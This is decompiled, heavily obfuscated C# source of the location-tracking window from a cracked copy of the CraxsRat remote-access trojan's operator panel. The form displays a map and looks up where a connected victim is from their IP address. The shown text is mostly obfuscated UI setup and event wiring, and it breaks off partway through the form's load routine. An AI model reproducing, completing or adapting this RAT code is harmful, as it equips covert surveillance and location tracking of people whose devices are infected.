// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.LocationManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class LocationManager : Form
  {
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Title;
    private ComboBox LastComboDGV5;
    private ComboBox LastComboDGV6;
    private DataGridViewCellCancelEventArgs EventArgs;
    private string EventName;
    public DataTable tmpTable;
    public string tmpFolderUSER;
    public string tmpClientName;
    public string tmpCountry;
    public string tmpAddressIP;
    public DataSet DS;
    public static readonly information._Closure\u0024__ \u0024I;
    public static WaitCallback \u0024IR163\u002D1;
    public static WaitCallback \u0024IR164\u002D2;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((Ports) this).components = (IContainer) new System.ComponentModel.Container();
      this.Map = new PictureBox();
      this.ProgressBar1 = new ProgressBar();
      this.TOpacity = new System.Windows.Forms.Timer(((Ports) this).components);
label_1:
      int num1 = -1427639009;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 * 1280656185 - (-((-555501786 ^ -362067105) + (-1271676192 ^ 2009804230)) + ~305983423) + -1899358013 * -1773792410)) % 56U)
        {
          case 0:
            this.Panel1.Location = new Point(434, 0);
            num1 = (int) num2 * 845530802 ^ 1439801293;
            continue;
          case 1:
            this.ProgressBar1.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 1572601115 ^ -1119680363;
            continue;
          case 2:
            this.ctxMenu.Items.AddRange(new ToolStripItem[4]
            {
              (ToolStripItem) this.SaveToolStripMenuItem,
              (ToolStripItem) this.SaveAsToolStripMenuItem,
              (ToolStripItem) this.OpenUsingGoogleMapsToolStripMenuItem,
              (ToolStripItem) this.OpenUsingMapBoxToolStripMenuItem
            });
            this.ctxMenu.Name = EXGuarder.\u00338406A46;
            num1 = (int) num2 * 1285701901 ^ -1031451864;
            continue;
          case 3:
            this.DrakeUICheckBox1.Text = EXGuarder.\u00329096A17;
            num1 = (int) num2 * 1996800683 ^ -1595828345;
            continue;
          case 4:
            this.Controls.Add((Control) this.Panel1);
            this.Controls.Add((Control) this.ProgressBar1);
            num1 = (int) num2 * -1277108919 ^ -1792556036;
            continue;
          case 5:
            this.DrakeUICheckBox1 = new DrakeUICheckBox();
            num1 = (int) num2 * 1358214683 ^ 1385874772;
            continue;
          case 6:
            this.Panel1.PerformLayout();
            num1 = (int) num2 * 206180647 ^ 937920633;
            continue;
          case 7:
            this.ProgressBar1.Location = new Point(0, 354);
            num1 = (int) num2 * -377499214 ^ 1185533040;
            continue;
          case 8:
            this.ShowIcon = false;
            num1 = (int) num2 * 291737888 ^ 60228820;
            continue;
          case 9:
            this.DrakeUICheckBox1.ForeColor = Color.White;
            this.DrakeUICheckBox1.Location = new Point(39, 6);
            this.DrakeUICheckBox1.Name = EXGuarder.\u00314617175;
            num1 = (int) num2 * 1514791899 ^ 582999320;
            continue;
          case 10:
            this.SaveAsToolStripMenuItem = new ToolStripMenuItem();
            this.OpenUsingGoogleMapsToolStripMenuItem = new ToolStripMenuItem();
            this.OpenUsingMapBoxToolStripMenuItem = new ToolStripMenuItem();
            this.Panel1 = new Panel();
            num1 = (int) num2 * -1602607493 ^ -1498098535;
            continue;
          case 11:
            this.Panel2.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 1496896120 ^ -762854039;
            continue;
          case 12:
            this.savetimer = new System.Windows.Forms.Timer(((Ports) this).components);
            num1 = (int) num2 * 286581371 ^ 927646765;
            continue;
          case 13:
            this.DrakeUICheckBox1.Size = new Size(69, 29);
            this.DrakeUICheckBox1.Style = UIStyle.Custom;
            this.DrakeUICheckBox1.TabIndex = 0;
            num1 = (int) num2 * -1729364843 ^ -898049357;
            continue;
          case 14:
            this.Map.TabStop = false;
            num1 = (int) num2 * -216514384 ^ 338410616;
            continue;
          case 15:
            this.Panel1.SuspendLayout();
            num1 = (int) num2 * -762287630 ^ 1834449925;
            continue;
          case 16:
            this.Panel1.Controls.Add((Control) this.Panel2);
            this.Panel1.Dock = DockStyle.Right;
            num1 = (int) num2 * -898034560 ^ -625781073;
            continue;
          case 17:
            this.TextBox1.Size = new Size(140, 314);
            num1 = (int) num2 * -746627261 ^ -966848391;
            continue;
          case 18:
            this.ProgressBar1.Size = new Size(574, 10);
            this.ProgressBar1.TabIndex = 1;
            num1 = (int) num2 * 1092531863 ^ 1079836950;
            continue;
          case 19:
            this.ResumeLayout(false);
            num1 = (int) num2 * 1758449471 ^ 1090631352;
            continue;
          case 20:
            this.SuspendLayout();
            this.Map.BackColor = Color.Black;
            num1 = (int) num2 * -628084074 ^ -485322911;
            continue;
          case 21:
            this.Text = EXGuarder.\u00322072477;
            num1 = (int) num2 * -1650282810 ^ -1648933373;
            continue;
          case 22:
            this.Panel2.Name = EXGuarder.\u0036630736A;
            this.Panel2.Size = new Size(140, 40);
            num1 = (int) num2 * 756130021 ^ -1747966957;
            continue;
          case 23:
            this.SaveAsToolStripMenuItem.Size = new Size(183, 22);
            this.SaveAsToolStripMenuItem.Text = EXGuarder.\u0035612150A;
            this.SaveAsToolStripMenuItem.Visible = false;
            this.OpenUsingGoogleMapsToolStripMenuItem.Name = EXGuarder.\u0032B277150;
            this.OpenUsingGoogleMapsToolStripMenuItem.Size = new Size(183, 22);
            num1 = (int) num2 * 1446287363 ^ -2053945713;
            continue;
          case 24:
            this.OpenUsingMapBoxToolStripMenuItem.Size = new Size(183, 22);
            num1 = (int) num2 * 1849600185 ^ -1821288693;
            continue;
          case 25:
            this.Opacity = 0.0;
            num1 = (int) num2 * -1816888308 ^ -1077897581;
            continue;
          case 26:
            this.Panel1.Controls.Add((Control) this.TextBox1);
            num1 = (int) num2 * 1673968729 ^ -1257609843;
            continue;
          case 27:
            this.TextBox1.TabIndex = 0;
            num1 = (int) num2 * 307611143 ^ 1821571714;
            continue;
          case 28:
            this.Panel2.SuspendLayout();
            num1 = (int) num2 * 1243378536 ^ -1654813565;
            continue;
          case 29:
            this.Map.Name = EXGuarder.\u003202F091A;
            this.Map.Size = new Size(434, 354);
            this.Map.TabIndex = 0;
            num1 = (int) num2 * 1010725127 ^ 1531385878;
            continue;
          case 30:
            this.Panel2.TabIndex = 3;
            this.DrakeUICheckBox1.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUICheckBox1.Cursor = Cursors.Hand;
            this.DrakeUICheckBox1.Font = new Font(EXGuarder.\u00357374D08, 12f);
            num1 = (int) num2 * -1549022500 ^ 1925388640;
            continue;
          case 31:
            this.ProgressBar1.Name = EXGuarder.\u0036D541E30;
            num1 = (int) num2 * -1201783005 ^ 178592804;
            continue;
          case 32:
            this.Panel2.Controls.Add((Control) this.DrakeUICheckBox1);
            num1 = (int) num2 * -1233171371 ^ -724096582;
            continue;
          case 33:
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * 966685497 ^ 763198200;
            continue;
          case 34:
            this.Panel2.Location = new Point(0, 314);
            num1 = (int) num2 * -1241751041 ^ -1586738493;
            continue;
          case 35:
            this.SaveToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 546062373 ^ -409583754;
            continue;
          case 36:
            this.Panel2.ResumeLayout(false);
            num1 = (int) num2 * 1146648333 ^ 133729686;
            continue;
          case 37:
            this.TextBox1.BackColor = Color.FromArgb(5, 5, 5);
            this.TextBox1.Dock = DockStyle.Fill;
            this.TextBox1.Font = new Font(EXGuarder.\u00357374D08, 9f, FontStyle.Bold);
            this.TextBox1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.TextBox1.Location = new Point(0, 0);
            this.TextBox1.Multiline = true;
            this.TextBox1.Name = EXGuarder.\u003282C6F60;
            this.TextBox1.ReadOnly = true;
            num1 = (int) num2 * 1614685521 ^ 245386181;
            continue;
          case 38:
            goto label_3;
          case 39:
            goto label_1;
          case 40:
            this.ctxMenu = new ContextMenuStrip(((Ports) this).components);
            num1 = (int) num2 * 1391679409 ^ 2071660818;
            continue;
          case 41:
            this.ctxMenu.SuspendLayout();
            num1 = (int) num2 * 688814138 ^ 124206388;
            continue;
          case 42:
            this.Map.Dock = DockStyle.Fill;
            num1 = (int) num2 * 598919246 ^ -1927068510;
            continue;
          case 43:
            this.ctxMenu.ShowImageMargin = false;
            this.ctxMenu.Size = new Size(184, 92);
            this.SaveToolStripMenuItem.Name = EXGuarder.\u003112F454D;
            this.SaveToolStripMenuItem.Size = new Size(183, 22);
            num1 = (int) num2 * -851781223 ^ -561799465;
            continue;
          case 44:
            this.DrakeUICheckBox1.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -263317194 ^ -71845004;
            continue;
          case 45:
            this.SaveToolStripMenuItem.Text = EXGuarder.\u00329096A17;
            this.SaveToolStripMenuItem.Visible = false;
            this.SaveAsToolStripMenuItem.Name = EXGuarder.\u0031276624D;
            num1 = (int) num2 * 1880512553 ^ 523347899;
            continue;
          case 46:
            ((ISupportInitialize) this.Map).EndInit();
            this.ctxMenu.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            num1 = (int) num2 * -815111973 ^ -1122607121;
            continue;
          case 47:
            this.Map.Location = new Point(0, 0);
            num1 = (int) num2 * 810534085 ^ -1733839625;
            continue;
          case 48:
            this.TextBox1 = new TextBox();
            this.Panel2 = new Panel();
            num1 = (int) num2 * -1610067183 ^ 1571104468;
            continue;
          case 49:
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MaximumSize = new Size(590, 403);
            this.Name = EXGuarder.\u00322072477;
            num1 = (int) num2 * 1406687415 ^ -214938785;
            continue;
          case 50:
            ((ISupportInitialize) this.Map).BeginInit();
            num1 = (int) num2 * -150944174 ^ -1702340444;
            continue;
          case 51:
            this.OpenUsingGoogleMapsToolStripMenuItem.Text = EXGuarder.\u0031D141014;
            this.OpenUsingMapBoxToolStripMenuItem.Name = EXGuarder.\u0035D475546;
            num1 = (int) num2 * -1600398842 ^ 265333901;
            continue;
          case 52:
            this.OpenUsingMapBoxToolStripMenuItem.Text = EXGuarder.\u003374D6504;
            num1 = (int) num2 * 1344264600 ^ -1968626052;
            continue;
          case 53:
            this.Panel1.BackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * 907542772 ^ -1255071555;
            continue;
          case 54:
            this.Panel1.Name = EXGuarder.\u003692B111A;
            this.Panel1.Size = new Size(140, 354);
            this.Panel1.TabIndex = 2;
            num1 = (int) num2 * -1192654469 ^ 1229866062;
            continue;
          case 55:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(574, 364);
            this.Controls.Add((Control) this.Map);
            num1 = (int) num2 * -160829125 ^ -1692679282;
            continue;
          default:
            goto label_58;
        }
      }
label_3:
      return;
label_58:;
    }

    internal virtual PictureBox Map
    {
      get => ((Ports) this)._Map;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler1 = new MouseEventHandler(this.Map_MouseWheel);
label_1:
        int num1 = 1789590405;
        PictureBox map;
        PaintEventHandler paintEventHandler;
        EventHandler eventHandler1;
        EventHandler eventHandler2;
        MouseEventHandler mouseEventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(-(num1 * -448508209) + (~~583884065 ^ ~(1042189519 - 314642659)) + (332399281 * -2064329631 + ~1744326888) - (-589608217 ^ -929329366))) % 13U)
          {
            case 0:
              int num3 = map == null ? -341285626 : (num3 = -912489014);
              num1 = num3 ^ (int) num2 * 559207463;
              continue;
            case 1:
              mouseEventHandler2 = new MouseEventHandler(this.Map_MouseDoubleClick);
              eventHandler2 = new EventHandler(this.Map_MouseHover);
              eventHandler1 = new EventHandler(this.Map_MouseLeave);
              paintEventHandler = new PaintEventHandler(this.Map_Paint);
              map = ((Ports) this)._Map;
              num1 = (int) num2 * 1551205938 ^ -2116880899;
              continue;
            case 2:
              map.Paint += paintEventHandler;
              num1 = (int) num2 * -1891383938 ^ -2030471338;
              continue;
            case 3:
              map.Paint -= paintEventHandler;
              num1 = (int) num2 * -1986164897 ^ 85311842;
              continue;
            case 4:
              map.MouseWheel += mouseEventHandler1;
              map.MouseDoubleClick += mouseEventHandler2;
              map.MouseHover += eventHandler2;
              map.MouseLeave += eventHandler1;
              num1 = (int) num2 * 319138830 ^ -1859780153;
              continue;
            case 5:
              map.MouseHover -= eventHandler2;
              num1 = (int) num2 * -901116310 ^ -709985636;
              continue;
            case 6:
              map.MouseLeave -= eventHandler1;
              num1 = (int) num2 * -382243250 ^ 1881819639;
              continue;
            case 7:
              goto label_3;
            case 8:
              int num4 = map == null ? -1410685407 : (num4 = -584081874);
              num1 = num4 ^ (int) num2 * 2116023634;
              continue;
            case 9:
              map.MouseWheel -= mouseEventHandler1;
              map.MouseDoubleClick -= mouseEventHandler2;
              num1 = (int) num2 * 424107529 ^ -1908401559;
              continue;
            case 10:
              map = ((Ports) this)._Map;
              num1 = (int) num2 * 650488452 ^ 626606760;
              continue;
            case 11:
              ((Ports) this)._Map = value;
              num1 = -1898926697;
              continue;
            case 12:
              goto label_1;
            default:
              goto label_15;
          }
        }
label_3:
        return;
label_15:;
      }
    }

    internal virtual ProgressBar ProgressBar1
    {
      get => ((Ports) this)._ProgressBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._ProgressBar1 = value;
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((Ports) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        System.Windows.Forms.Timer topacity = ((Ports) this)._TOpacity;
label_1:
        int num1 = 850575214;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((~~num1 ^ ~-(-375030365 - 2123272984)) - 341116847 * (85196267 * 1414329503) ^ -1293183708 - 1527160428)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * -1522636272 ^ -428282860;
              continue;
            case 2:
              topacity = ((Ports) this)._TOpacity;
              int num3 = topacity == null ? 516615910 : (num3 = -1354804187);
              num1 = num3 ^ (int) num2 * 2105300597;
              continue;
            case 3:
              int num4 = topacity == null ? 945386904 : (num4 = -812534688);
              num1 = num4 ^ (int) num2 * -24074934;
              continue;
            case 4:
              goto label_3;
            case 5:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -1852840052 ^ -751000372;
              continue;
            case 6:
              ((Ports) this)._TOpacity = value;
              num1 = -969833426;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ContextMenuStrip ctxMenu
    {
      get => ((Ports) this)._ctxMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._ctxMenu = value;
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => ((Ports) this)._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveToolStripMenuItem_Click);
label_1:
        int num1 = 783940292;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) ~(604642497 - 928775102 - (-1160592275 * (--837385018 + ~32486303) - -(-1347615340 * -1248961351) - (num2 ^ (-827520975 * 961061111 ^ 1157486894 - ~739058869 ^ --685573240) + (~(~1737554859 ^ ~333520344) - 2017191079)) + (-(740032777 ^ 1780193860) ^ -311194769) + -1141313387 * (866921759 ^ -623231056)))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = toolStripMenuItem == null ? 1239402704 : (num4 = -1707557076);
              num1 = num4 ^ (int) num3 * -1124176146;
              continue;
            case 2:
              ((Ports) this)._SaveToolStripMenuItem = value;
              num1 = -1312814373;
              continue;
            case 3:
              goto label_3;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -1393375206 ^ 1780526487;
              continue;
            case 5:
              toolStripMenuItem = ((Ports) this)._SaveToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? -1325605446 : (num5 = 1299763872);
              num1 = num5 ^ (int) num3 * -1953917327;
              continue;
            case 6:
              toolStripMenuItem = ((Ports) this)._SaveToolStripMenuItem;
              num1 = (int) num3 * 170926662 ^ -1869218140;
              continue;
            case 7:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 328190967 ^ 905897807;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => ((Ports) this)._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
label_1:
        int num1 = 116645113;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (~(---(-1652249177 * -214782584) - num2 + (-(~-1054319556 * 1182222313) ^ -(1770164805 * (1444559234 ^ -836639116)))) * 1361969233 - (180022067 ^ -294123841) - -434327264)) % 8U)
          {
            case 0:
              ((Ports) this)._SaveAsToolStripMenuItem = value;
              toolStripMenuItem = ((Ports) this)._SaveAsToolStripMenuItem;
              num1 = -1762272211;
              continue;
            case 1:
              int num4 = toolStripMenuItem == null ? -684957964 : (num4 = -550575217);
              num1 = num4 ^ (int) num3 * 1466381892;
              continue;
            case 2:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1646954860 ^ -1157828636;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              toolStripMenuItem = ((Ports) this)._SaveAsToolStripMenuItem;
              num1 = (int) num3 * -1285336122 ^ -246132972;
              continue;
            case 6:
              int num5 = toolStripMenuItem == null ? 68650500 : (num5 = 117937070);
              num1 = num5 ^ (int) num3 * -1672662732;
              continue;
            case 7:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1314105526 ^ 209234342;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem OpenUsingGoogleMapsToolStripMenuItem
    {
      get => ((Ports) this)._OpenUsingGoogleMapsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenUsingGoogleMapsToolStripMenuItem_Click);
label_1:
        int num1 = 2130735351;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~(~(num1 ^ -1604457587 * -327672959 + ~(73512377 + 1402888408 - (996762983 + 2043192430)) ^ (~(-212258671 * -2125519808) ^ -996443959) - (-426775318 - 279822169 ^ 565851377 * 465706223) * -1170873723) + (671652609 * -1696826721 + 53726412 - 566361861) + 1324985545 * (658983863 * 180156717))) % 8U)
          {
            case 0:
              toolStripMenuItem = ((Ports) this)._OpenUsingGoogleMapsToolStripMenuItem;
              num1 = (int) num2 * -350069804 ^ 275403430;
              continue;
            case 1:
              toolStripMenuItem = ((Ports) this)._OpenUsingGoogleMapsToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? -1277989024 : (num3 = -806712394);
              num1 = num3 ^ (int) num2 * -79985732;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? -2010582455 : (num4 = -1839137945);
              num1 = num4 ^ (int) num2 * 426898909;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 936651624 ^ 1258959947;
              continue;
            case 4:
              ((Ports) this)._OpenUsingGoogleMapsToolStripMenuItem = value;
              num1 = 1585748856;
              continue;
            case 5:
              goto label_3;
            case 6:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1790253045 ^ 1830758378;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem OpenUsingMapBoxToolStripMenuItem
    {
      get => ((Ports) this)._OpenUsingMapBoxToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenUsingMapBoxToolStripMenuItem_Click);
label_1:
        int num1 = -332675677;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((((num1 ^ ~-1912685935 ^ -~--1254697436 + (1021188012 * 1651086057 + 1588365053 * (-637512495 - -180276730))) - ~(1918739565 * (~1330134087 + (1994947431 - 581221091)))) * 147599473 - (-1482790875 - 330392216 + (1113161627 - -1765920218))) * -1340433125 - 211238837)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = toolStripMenuItem == null ? 953453140 : (num3 = 1229284199);
              num1 = num3 ^ (int) num2 * 1361920930;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? -13076632 : (num4 = -1875609563);
              num1 = num4 ^ (int) num2 * -1780528115;
              continue;
            case 3:
              toolStripMenuItem = ((Ports) this)._OpenUsingMapBoxToolStripMenuItem;
              num1 = (int) num2 * -1393877141 ^ 950963728;
              continue;
            case 4:
              ((Ports) this)._OpenUsingMapBoxToolStripMenuItem = value;
              toolStripMenuItem = ((Ports) this)._OpenUsingMapBoxToolStripMenuItem;
              num1 = 73175812;
              continue;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1893570124 ^ 365553346;
              continue;
            case 6:
              goto label_1;
            case 7:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -1633615809 ^ 90273499;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Ports) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._Panel1 = value;
    }

    internal virtual TextBox TextBox1
    {
      get => ((Ports) this)._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._TextBox1 = value;
    }

    internal virtual Panel Panel2
    {
      get => ((Ports) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._Panel2 = value;
    }

    internal virtual DrakeUICheckBox DrakeUICheckBox1
    {
      get => ((Ports) this)._DrakeUICheckBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DrakeUICheckBox.OnValueChanged onValueChanged = new DrakeUICheckBox.OnValueChanged(this.DrakeUICheckBox1_ValueChanged);
label_1:
        int num1 = -2141678143;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUICheckBox drakeUiCheckBox1;
          switch ((num3 = (uint) (1876511028 - --(~(num2 ^ -(--61239504 + (~537558205 + ~-731625586) - -1977888211 * ~1064644909)) ^ -1873293203))) % 7U)
          {
            case 0:
              drakeUiCheckBox1.ValueChanged += onValueChanged;
              num1 = (int) num3 * 991097494 ^ -1264843381;
              continue;
            case 1:
              drakeUiCheckBox1 = ((Ports) this)._DrakeUICheckBox1;
              int num4 = drakeUiCheckBox1 == null ? 1121186982 : (num4 = 1499061562);
              num1 = num4 ^ (int) num3 * 1904139259;
              continue;
            case 2:
              drakeUiCheckBox1.ValueChanged -= onValueChanged;
              num1 = (int) num3 * 1495925747 ^ 1337961081;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              ((Ports) this)._DrakeUICheckBox1 = value;
              drakeUiCheckBox1 = ((Ports) this)._DrakeUICheckBox1;
              num1 = -1977835366;
              continue;
            case 6:
              int num5 = drakeUiCheckBox1 == null ? 856979541 : (num5 = 1538543200);
              num1 = num5 ^ (int) num3 * 444832156;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual System.Windows.Forms.Timer savetimer
    {
      get => ((Ports) this)._savetimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Savetimer_Tick);
label_1:
        int num1 = -1344373472;
        System.Windows.Forms.Timer savetimer;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --~(num1 ^ -(-1315086883 * 2104873086 ^ ~(-403648652 * -1084038517) + (--2119447947 + (-1220495948 ^ -331128408))) ^ 865688668 - ~-882008867 + (-621805321 - 2072381596 ^ -2057620281) - -1362295429 * ((290452809 - 1923270549) * -2085986881))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              savetimer = ((Ports) this)._savetimer;
              int num3 = savetimer == null ? -1938390911 : (num3 = -181192322);
              num1 = num3 ^ (int) num2 * 1282610324;
              continue;
            case 2:
              savetimer = ((Ports) this)._savetimer;
              num1 = (int) num2 * 955806287 ^ -1980653462;
              continue;
            case 3:
              savetimer.Tick -= eventHandler;
              num1 = (int) num2 * -1228919333 ^ 619137620;
              continue;
            case 4:
              ((Ports) this)._savetimer = value;
              num1 = -931478557;
              continue;
            case 5:
              int num4 = savetimer == null ? -1688336165 : (num4 = -2095959342);
              num1 = num4 ^ (int) num2 * -2111079007;
              continue;
            case 6:
              savetimer.Tick += eventHandler;
              num1 = (int) num2 * -222949783 ^ -974902560;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    public virtual WebClient waiter1
    {
      get => ((Ports) this)._waiter1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DownloadProgressChangedEventHandler changedEventHandler = new DownloadProgressChangedEventHandler(this.waiter1_DownloadProgressChanged);
        WebClient waiter1 = ((Ports) this)._waiter1;
label_1:
        int num1 = 367631030;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 + (-(131660452 - 237470263 ^ -1214221405 - -2061728317) * 607806249 ^ -~~-1892166005 + (-810468868 - 2073730827 + (1112747384 + 1195590901) - ~(-1692007815 * 903322640))) - (~~645708314 + (-~-2036763677 ^ -(-345155194 - 452574575))))) % 8U)
          {
            case 0:
              waiter1 = ((Ports) this)._waiter1;
              num1 = (int) num2 * -1441842949 ^ 646671216;
              continue;
            case 1:
              int num3 = waiter1 == null ? -2020698090 : (num3 = 304678112);
              num1 = num3 ^ (int) num2 * 1668367714;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((Ports) this)._waiter1 = value;
              num1 = 863656399;
              continue;
            case 4:
              waiter1.DownloadProgressChanged += changedEventHandler;
              num1 = (int) num2 * 385164966 ^ 121293985;
              continue;
            case 5:
              waiter1.DownloadProgressChanged -= changedEventHandler;
              num1 = (int) num2 * -67109259 ^ 856070893;
              continue;
            case 6:
              goto label_3;
            case 7:
              int num4 = waiter1 == null ? -1377547023 : (num4 = 1345005555);
              num1 = num4 ^ (int) num2 * 2042533672;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    private void TOpacity_Tick(object sender, System.EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = -136794647;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-1176806358 - ~(num2 + (--(-949243403 - 1925145586) ^ ~((-324411583 * -1585963847 ^ 2052284657 ^ 1075720369) + (~-1520980022 ^ ~1744116640)))))) % 5U)
        {
          case 0:
            goto label_5;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num3 * 1900490944 ^ 1589611521;
            continue;
          case 2:
            num1 = (int) num3 * 1484591111 ^ 853453906;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 1100445791;
      goto label_2;
    }

    private void LocationManager_Load(object sender, System.EventArgs e)
    {
      this.SaveToolStripMenuItem.Visible = true;
      this.SaveAsToolStripMenuItem.Visible = true;
label_1:
      int num1 = -1816520632;
      string str;
      int index;
      string[] strArray1;
      string[] strArray2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((~num1 - ~(~(-874628420 ^ 604053050) * -742478731)) * -1311828937 + (1285177888 ^ 1179307274 ^ 216228145 ^ -1672777407)) * -895891341 - -588386010)) % 14U)
        {
          case 0:
            this.Icon = new Icon(Settings.res_Path + EXGuarder.\u00355241951);
            num1 = (int) num2 * 1063700467 ^ -1502849065;
            continue;
          case 1:
            int num3;
            num1 = num3 = index < strArray2.Length ? 1327685926 : (num3 = 360492241);
            continue;
          case 3:
            ((Ports) this).Threadingg.Start();
            num1 = (int) num2 * 15088373 ^ 154952328;
            continue;
          case 4:
            goto label_1;
          case 5:
            this.TextBox1.AppendText(strArray2[index] + EXGuarder.\u00304621254);
            checked { ++index; }
            num1 = -1439661068;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            str = Craxs_Rat.sockets.Data.VB\u0024StateMachine_39_HandelData.cityclass.Getinfo(((Craxs_Rat.sockets.Data) ((Ports) this).classClient).ClientAddressIP);
            num1 = (int) num2 * -1841768543 ^ 330910060;
            continue;
          case 7:
            ((Ports) this).Threadingg.Priority = ThreadPriority.Normal;
            num1 = (int) num2 * -1667836069 ^ -1400247238;
            continue;
          case 8:
